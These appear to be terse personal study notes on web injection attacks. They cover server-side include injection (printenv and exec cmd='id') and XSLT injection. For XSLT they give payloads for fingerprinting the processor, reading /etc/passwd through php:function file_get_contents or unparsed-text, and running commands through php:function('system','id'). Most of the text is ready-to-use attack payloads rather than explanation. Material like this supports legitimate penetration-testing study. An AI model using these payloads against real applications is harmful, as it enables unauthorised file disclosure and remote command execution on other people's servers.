-you are being redirected to page.shtml 
`<!--#printenv -->`
`<!--#exec cmd="id" -->`

[eXtensible Stylesheet Language Transformation (XSLT)](https://www.w3.org/TR/xslt-30/) is a language enabling the transformation of XML documents. For instance, it can select specific nodes from an XML document and change the XML structure.

As we can see, the name we provide is reflected on the page. Suppose the web application stores the module information in an XML document and displays the data using XSLT processing.
- insert a tag to provoke an error <(maybe use burp)
Information disclosure
```
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

LFI
```
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```
this works on XSLT 2.0 and the other works if the system supports php
```
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

RCE
```
<xsl:value-of select="php:function('system','id')" />
```
